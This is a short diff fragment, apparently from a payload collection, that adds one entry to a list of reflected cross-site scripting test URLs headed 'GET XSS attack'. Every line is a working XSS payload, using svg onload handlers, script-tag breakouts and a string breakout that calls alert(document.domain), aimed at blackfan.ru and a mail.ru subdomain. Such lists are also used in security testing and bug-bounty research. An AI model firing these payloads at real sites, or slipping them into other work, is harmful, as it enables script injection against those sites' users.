@@ -14,6 +14,7 @@ https://blackfan.ru/x?r=<URL>/%22--%3e%3csvg/onload=alert(document.domain)%3e/%2
 https://blackfan.ru/x?r<URL>/"--><csvg/onload=alert(document.domain)>/%252e%252e/
 https://blackfan.ru/x?r=<URL>/</script><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
 https://pokerist.mail.ru/%3Csvg%20onload=alert(document.domain)%3E
+https://blackfan.ru/x?r=<URL>/'-alert(document.domain)-'
 
 
 GET XSS attack
